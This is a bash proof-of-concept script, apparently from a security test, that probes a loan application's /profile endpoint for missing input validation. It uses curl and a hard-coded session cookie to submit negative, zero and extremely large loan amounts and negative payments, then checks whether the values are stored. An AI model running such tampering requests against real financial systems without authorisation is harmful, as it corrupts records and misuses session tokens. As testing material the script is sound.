#!/bin/bash

# POC: Missing Input Validation - Negative Loan Amounts and Extreme Values Accepted
# Target: /profile endpoint
# Description: Tests that the application accepts and stores invalid loan amounts (negative values and extremely large values)

BASE_URL="${1:-http://localhost:8080}"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aS8RzQ.tNryOSP5qryCamiD-ECEPNA-JVM"

echo "========================================"
echo "POC: Invalid Loan Amount Validation"
echo "========================================"
echo "Target: $BASE_URL/profile"
echo ""

# Test 1: Negative Loan Amount
echo "[TEST 1] Testing negative loan amount (-50000)..."
RESPONSE=$(curl -s -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=-50000&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile")

echo "Response Status Test 1:"
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=-50000&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile"

echo "Response Body (checking if negative amount is stored):"
echo "$RESPONSE" | grep -o "value=\"-50000\"" && echo "✓ VULNERABLE: Negative loan amount accepted and stored" || echo "Response received"
echo ""

# Test 2: Extremely Large Loan Amount
echo "[TEST 2] Testing extremely large loan amount (999999999999)..."
RESPONSE=$(curl -s -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=999999999999&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile")

echo "Response Status Test 2:"
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=999999999999&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile"

echo "Response Body (checking if large amount is stored):"
echo "$RESPONSE" | grep -o "value=\"999999999999\"" && echo "✓ VULNERABLE: Extremely large loan amount accepted" || echo "Response received"
echo ""

# Test 3: Zero Loan Amount
echo "[TEST 3] Testing zero loan amount (0)..."
RESPONSE=$(curl -s -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=0&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile")

echo "Response Status Test 3:"
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=0&loan_term_months=60&monthly_payment=100" \
  "$BASE_URL/profile"

echo "Response Body (checking if zero amount is stored):"
echo "$RESPONSE" | grep -o "value=\"0\"" && echo "✓ VULNERABLE: Zero loan amount accepted" || echo "Response received"
echo ""

# Test 4: Negative Monthly Payment
echo "[TEST 4] Testing negative monthly payment (-100)..."
RESPONSE=$(curl -s -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=50000&loan_term_months=60&monthly_payment=-100" \
  "$BASE_URL/profile")

echo "Response Status Test 4:"
curl -s -o /dev/null -w "HTTP Status: %{http_code}\n" -X POST \
  -b "$SESSION_COOKIE" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=50000&loan_term_months=60&monthly_payment=-100" \
  "$BASE_URL/profile"

echo "Response Body (checking if negative payment is stored):"
echo "$RESPONSE" | grep -o "value=\"-100\"" && echo "✓ VULNERABLE: Negative monthly payment accepted" || echo "Response received"
echo ""

# Test 5: Verify stored values via GET request
echo "[TEST 5] Verifying stored values via GET request..."
GET_RESPONSE=$(curl -s -X GET \
  -b "$SESSION_COOKIE" \
  "$BASE_URL/profile")

echo "GET Response (should show previously set invalid values):"
echo "$GET_RESPONSE" | grep -E "loan_amount|monthly_payment|loan_term" | head -10
echo ""

echo "========================================"
echo "POC Complete"
echo "========================================"